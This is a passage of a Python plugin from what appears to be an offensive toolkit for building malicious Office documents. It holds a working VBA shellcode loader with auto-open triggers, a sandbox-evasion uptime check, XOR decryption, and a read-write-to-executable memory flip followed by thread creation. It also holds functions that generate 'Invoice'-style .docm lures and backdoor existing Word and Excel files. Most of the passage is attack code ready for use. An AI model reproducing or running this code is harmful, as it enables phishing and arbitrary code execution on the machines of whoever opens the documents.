Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle        As LongPtr, _
    ByVal dwMilliseconds As Long)    As Long

Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
    ByVal hObject As LongPtr) As Long

' Uptime in ms — sandbox gate
Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long

' --- Auto-exec triggers (both for Word coverage) ---

Sub Document_Open()
    On Error Resume Next
    Call ExecuteShellcode()
End Sub

Sub AutoOpen()
    On Error Resume Next
    Call ExecuteShellcode()
End Sub

' --- Array helpers (shared with Excel loaders) ---

Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
    Dim combined() As Variant
    Dim i As Long, j As Long
    Dim size1 As Long, size2 As Long
    size1 = UBound(arr1) - LBound(arr1) + 1
    size2 = UBound(arr2) - LBound(arr2) + 1
    ReDim combined(0 To size1 + size2 - 1)
    For i = 0 To size1 - 1
        combined(i) = arr1(LBound(arr1) + i)
    Next i
    For j = 0 To size2 - 1
        combined(size1 + j) = arr2(LBound(arr2) + j)
    Next j
    ConcatenateArrays = combined
End Function

Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
    Dim decrypted() As Byte
    Dim i As Long
    Dim keyLen As Long
    keyLen = UBound(key) - LBound(key) + 1
    ReDim decrypted(LBound(encrypted) To UBound(encrypted))
    For i = LBound(encrypted) To UBound(encrypted)
        decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
    Next i
    XorDecrypt = decrypted
End Function

' --- Sandbox gate ---

Private Function SandboxDetected() As Boolean
    SandboxDetected = False
    ' Abort if system uptime < 5 minutes (freshly spun sandbox VM)
    If GetTickCount() < 300000 Then
        SandboxDetected = True
        Exit Function
    End If
End Function

' --- Core loader ---

Sub ExecuteShellcode()
    On Error Resume Next

    If SandboxDetected() Then Exit Sub

    Dim shellcode As Variant
    Dim key As Variant
    Dim addr As LongPtr
    Dim hThread As LongPtr
    Dim threadId As Long
    Dim scLen As Long
    Dim oldProt As Long
    Dim decrypted As Variant
    Dim i As Long

    {chunked_shellcode}

    decrypted = XorDecrypt(shellcode, key)
    scLen = UBound(decrypted) - LBound(decrypted) + 1

    ' Alloc RW only (PAGE_READWRITE = 0x04, MEM_COMMIT|MEM_RESERVE = 0x3000)
    addr = VirtualAlloc(0, scLen, &H3000, &H4)
    If addr = 0 Then Exit Sub

    ' Copy shellcode byte-by-byte into RW allocation
    For i = LBound(decrypted) To UBound(decrypted)
        RtlMoveMemory addr + i, decrypted(i), 1
    Next i

    ' Zero source buffer to remove plaintext from Word heap
    For i = LBound(decrypted) To UBound(decrypted)
        decrypted(i) = 0
    Next i

    ' Flip RW -> RX (PAGE_EXECUTE_READ = 0x20)
    If VirtualProtect(addr, scLen, &H20, oldProt) = 0 Then Exit Sub

    hThread = CreateThread(0, 0, addr, 0, 0, threadId)

    If hThread <> 0 Then
        WaitForSingleObject hThread, &HFFFFFFFF
        CloseHandle hThread
    End If
End Sub
'''

    def generate_word_vba_loader(self, vba_shellcode, trigger_type="AutoOpen",
                                  loader_type="createthread",
                                  target_process="C:\\Windows\\System32\\notepad.exe"):
        """Generate VBA shellcode loader for Word documents (.docm/.doc).

        Uses Document_Open + AutoOpen dual triggers.
        createthread variant uses the improved RW→RX allocation pattern with
        VirtualProtect and source buffer zeroing.  Other techniques delegate to
        the existing Excel generators and prepend a Document_Open wrapper.

        Args:
            vba_shellcode: shellcode in VBA array format (from shellcrypt -f vba)
            trigger_type:  AutoOpen (ignored for createthread — both triggers always emitted)
            loader_type:   createthread | enumlocales | queueuserapc | hollowing
            target_process: target for hollowing technique

        Returns:
            str: complete VBA module ready to embed in a Word document
        """
        if loader_type == "createthread":
            return self._generate_word_loader_createthread_rwrx(vba_shellcode)
        elif loader_type == "enumlocales":
            return self._wrap_with_document_open(
                self.generate_vba_loader_enumlocales(vba_shellcode, trigger_type)
            )
        elif loader_type == "queueuserapc":
            return self._wrap_with_document_open(
                self.generate_vba_loader_queueuserapc(vba_shellcode, trigger_type)
            )
        elif loader_type == "hollowing":
            return self._wrap_with_document_open(
                self.generate_vba_loader_process_hollowing(vba_shellcode, trigger_type, target_process)
            )
        else:
            return self._generate_word_loader_createthread_rwrx(vba_shellcode)

    def _resolve_word_template_path(self, output_path):
        """Locate template.docm (or template.doc) in the templates directory.

        Search order:
        1. agent_code/templates/
        2. erebus/templates/  (legacy fallback)

        Returns Path or None.
        """
        output_path = Path(output_path)
        ext = output_path.suffix.lower()
        template_name = "template.docm" if ext != ".doc" else "template.doc"

        repo_root = Path(__file__).resolve().parents[2]
        candidates = [
            repo_root / "agent_code" / "templates" / template_name,
            Path(__file__).resolve().parent.parent / "templates" / template_name,
        ]
        for candidate in candidates:
            if candidate.exists():
                return candidate
        return None

    def _inject_vba_into_word(self, word_path, vba_code):
        """Inject VBA into a .docm ZIP archive (word/vbaProject.bin).

        Mirror of _inject_vba_into_excel but with Word-specific paths:
        - Relationships: word/_rels/document.xml.rels
        - VBA binary:    word/vbaProject.bin
        - Content type:  application/vnd.ms-office.vbaProject
        """
        libs = self._get_excel_libs()
        zipfile_mod = libs['zipfile']
        ET = libs['ET']
        import tempfile
        import shutil
        import os

        word_path = Path(word_path)
        temp_dir = Path(tempfile.mkdtemp())

        try:
            with zipfile_mod.ZipFile(str(word_path), 'r') as zf:
                zf.extractall(str(temp_dir))

            ns_rels = 'http://schemas.openxmlformats.org/package/2006/relationships'
            vba_rel_type = 'http://schemas.microsoft.com/office/2006/relationships/vbaProject'

            # Update word/_rels/document.xml.rels
            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
            if rels_path.exists():
                try:
                    tree = ET.parse(str(rels_path))
                    root = tree.getroot()
                    vba_rel_exists = any(
                        'vbaProject' in rel.get('Target', '')
                        for rel in root.findall('{%s}Relationship' % ns_rels)
                    )
                    if not vba_rel_exists:
                        existing_ids = [
                            int(r.get('Id', 'rId0').replace('rId', ''))
                            for r in root.findall('{%s}Relationship' % ns_rels)
                            if r.get('Id', '').startswith('rId')
                        ]
                        next_id = max(existing_ids, default=0) + 1
                        new_rel = ET.Element('{%s}Relationship' % ns_rels)
                        new_rel.set('Id', f'rId{next_id}')
                        new_rel.set('Type', vba_rel_type)
                        new_rel.set('Target', 'vbaProject.bin')
                        root.append(new_rel)
                        tree.write(str(rels_path), encoding='utf-8', xml_declaration=True)
                except Exception:
                    pass

            # Update [Content_Types].xml
            ct_path = temp_dir / "[Content_Types].xml"
            if ct_path.exists():
                try:
                    ns_ct = 'http://schemas.openxmlformats.org/package/2006/content-types'
                    tree = ET.parse(str(ct_path))
                    root = tree.getroot()
                    vba_ct_exists = any(
                        'vbaProject.bin' in ov.get('PartName', '')
                        for ov in root.findall('{%s}Override' % ns_ct)
                    )
                    if not vba_ct_exists:
                        new_ov = ET.Element('{%s}Override' % ns_ct)
                        new_ov.set('PartName', '/word/vbaProject.bin')
                        new_ov.set('ContentType', 'application/vnd.ms-office.vbaProject')
                        root.append(new_ov)
                        tree.write(str(ct_path), encoding='utf-8', xml_declaration=True)
                except Exception:
                    pass

            # Write compiled VBA project
            word_dir = temp_dir / "word"
            word_dir.mkdir(exist_ok=True)
            vba_bin_path = word_dir / "vbaProject.bin"
            vba_bin_path.write_bytes(self._create_vbaproject_with_code(vba_code))

            # Repack
            if word_path.exists():
                word_path.unlink()
            with zipfile_mod.ZipFile(str(word_path), 'w', zipfile_mod.ZIP_DEFLATED) as zf:
                for root_sub, _, files_sub in os.walk(str(temp_dir)):
                    for fname in files_sub:
                        fp = Path(root_sub) / fname
                        arcname = str(fp.relative_to(temp_dir)).replace('\\', '/')
                        zf.write(str(fp), arcname)
        finally:
            shutil.rmtree(str(temp_dir), ignore_errors=True)

    def create_new_word_with_payload(self, output_path, vba_code, document_name="Invoice",
                                      template_path=None):
        """Create a new .docm Word document with embedded VBA payload.

        Uses a template.docm if available; otherwise creates a minimal
        ZIP-based .docm from scratch.

        Args:
            output_path:   destination file path (.docm or .doc)
            vba_code:      VBA source to embed
            document_name: used for fallback document content
            template_path: optional explicit template path

        Returns:
            Path: path to created document
        """
        output_path = Path(output_path)
        output_path.parent.mkdir(parents=True, exist_ok=True)

        if template_path is None:
            template_path = self._resolve_word_template_path(output_path)

        if template_path and Path(template_path).exists():
            return self._create_word_from_template(output_path, vba_code, Path(template_path))

        # Fallback: build a minimal .docm from scratch
        return self._create_word_scratch(output_path, vba_code, document_name)

    def _create_word_from_template(self, output_path, vba_code, template_path):
        """Copy template.docm and inject VBA."""
        import shutil
        output_path = Path(output_path)
        template_path = Path(template_path)
        if not template_path.exists():
            raise FileNotFoundError(f"Word template not found: {template_path}")
        shutil.copy(str(template_path), str(output_path))
        self._inject_vba_into_word(str(output_path), vba_code)
        return output_path

    def _create_word_scratch(self, output_path, vba_code, document_name="Invoice"):
        """Build a minimal .docm ZIP from scratch and inject VBA.

        Produces the smallest valid Open XML Word document that Excel will
        open without complaint.  Real-world delivery should use a template.
        """
        import zipfile as zf_mod
        import io

        output_path = Path(output_path)

        # Minimal document.xml
        doc_xml = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"'
            ' xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body><w:p><w:r><w:t>' + document_name + '</w:t></w:r></w:p></w:body>'
            '</w:document>'
        )

        content_types = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml"'
            ' ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '<Override PartName="/word/vbaProject.bin"'
            ' ContentType="application/vnd.ms-office.vbaProject"/>'
            '</Types>'
        )

        rels = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1"'
            ' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
            ' Target="word/document.xml"/>'
            '</Relationships>'
        )

        word_rels = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1"'
            ' Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject"'
            ' Target="vbaProject.bin"/>'
            '</Relationships>'
        )

        vba_bin = self._create_vbaproject_with_code(vba_code)

        buf = io.BytesIO()
        with zf_mod.ZipFile(buf, 'w', zf_mod.ZIP_DEFLATED) as zf:
            zf.writestr('[Content_Types].xml', content_types)
            zf.writestr('_rels/.rels', rels)
            zf.writestr('word/document.xml', doc_xml)
            zf.writestr('word/_rels/document.xml.rels', word_rels)
            zf.writestr('word/vbaProject.bin', vba_bin)

        output_path.write_bytes(buf.getvalue())
        return output_path

    def backdoor_word_document(self, source_path, output_path, vba_code):
        """Backdoor an existing Word document by injecting VBA.

        Args:
            source_path: path to source .docm file
            output_path: destination for the backdoored file
            vba_code:    VBA source to inject

        Returns:
            Path: path to backdoored document
        """
        import shutil
        source_path = Path(source_path)
        output_path = Path(output_path)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(str(source_path), str(output_path))
        self._inject_vba_into_word(str(output_path), vba_code)
        return output_path

    def generate_word_payload(self, payload_path, vba_payload, output_path=None,
                               template_path=None, doc_format="docm"):
        """Registered: create a Word document with embedded VBA payload.

        Args:
            payload_path:  unused (kept for API symmetry with generate_excel_payload)
            vba_payload:   VBA source
            output_path:   destination path (extension determines format)
            template_path: optional explicit template
            doc_format:    "docm" or "doc" (used when output_path has no extension)

        Returns:
            Path: path to generated document
        """
        if output_path is None:
            output_path = Path(f"malicious_document.{doc_format}")
        return self.create_new_word_with_payload(output_path, vba_payload,
                                                  template_path=template_path)

    def backdoor_existing_word(self, source_word, vba_payload, output_path=None):
        """Registered: backdoor an existing Word file with VBA payload.

        Args:
            source_word:  path to source Word document
            vba_payload:  VBA source to inject
            output_path:  destination path (optional)

        Returns:
            Path: path to backdoored document
        """
        if output_path is None:
            src = Path(source_word)
            output_path = src.parent / f"{src.stem}_backdoored{src.suffix}"
        return self.backdoor_word_document(source_word, output_path, vba_payload)


# Instantiate plugin
_plugin = PayloadMalDocsPlugin()

# Register plugin functions
def generate_excel_payload(payload_path, vba_payload, output_path=None, template_path=None):
    """Generate a malicious Excel document with embedded payload."""
    return _plugin.generate_excel_payload(payload_path, vba_payload, output_path, template_path)

def backdoor_existing_excel(source_excel, vba_payload, output_path=None):
    """Backdoor an existing Excel file with VBA payload."""
    return _plugin.backdoor_existing_excel(source_excel, vba_payload, output_path)

def export_vba_as_text(vba_code, output_path=None):
    """Export VBA code as plain text."""
    return _plugin.export_vba_as_text(vba_code, output_path)

def export_vba_as_bas(vba_code, output_path, module_name="Payload"):
    """Export VBA code as .bas module file."""
    return _plugin.export_vba_as_bas(vba_code, output_path, module_name)

def validate():
    """Validate plugin dependencies."""
    return _plugin.validate()

def generate_xll_template(shellcode_hex, encryption_type="XOR", injection_method="CreateThread", target_process="explorer.exe", guardrail_includes="", guardrail_code=""):
    """Generate C/C++ XLL (Excel Add-In) source code."""
    return _plugin.generate_xll_template(shellcode_hex, encryption_type, injection_method, target_process, guardrail_includes, guardrail_code)

def register_xll_function(function_name, function_macro):
    """Register an XLL function for Excel."""
    return _plugin.register_xll_function(function_name, function_macro)

def generate_word_payload(payload_path, vba_payload, output_path=None, template_path=None, doc_format="docm"):
    """Generate a Word document (.docm/.doc) with embedded VBA payload."""
    return _plugin.generate_word_payload(payload_path, vba_payload, output_path, template_path, doc_format)

def backdoor_existing_word(source_word, vba_payload, output_path=None):
    """Backdoor an existing Word document with VBA payload."""
    return _plugin.backdoor_existing_word(source_word, vba_payload, output_path)

def generate_word_vba_loader(vba_shellcode, trigger_type="AutoOpen", loader_type="createthread",
                              target_process="C:\\Windows\\System32\\notepad.exe"):
    """Generate Word-optimized VBA shellcode loader."""
    return _plugin.generate_word_vba_loader(vba_shellcode, trigger_type, loader_type, target_process)


# Test block for standalone execution
if __name__ == "__main__":
    print(f"[*] {_plugin.metadata.name} v{_plugin.metadata.version}")
    print(f"[*] Category: {_plugin.metadata.category.value}")
    print(f"[*] Description: {_plugin.metadata.description}")
    print()

    # Display all registered functions
    registered = _plugin.register()
    registered_names = sorted(registered.keys()) if registered else []
    print(f"[*] Registered functions ({len(registered_names)}):")
    for func_name in registered_names:
        print(f"    - {func_name}")
    print()

    # Show VBA loader techniques
    loader_techniques = [
        "createthread - VirtualAlloc + CreateThread (classic, reliable)",
        "enumlocales - EnumSystemLocalesA callback (bypasses static analysis)",
        "queueuserapc - QueueUserAPC injection (APC-based execution)",
        "hollowing - Process hollowing (notepad.exe host)"
    ]
    print(f"[*] VBA Loader Techniques ({len(loader_techniques)}):")
    for technique in loader_techniques:
        print(f"    - {technique}")
    print()

    is_valid, error = validate()
    if is_valid:
        print("[+] Validation passed - openpyxl available")
    else:
        print(f"[-] Validation failed: {error}")
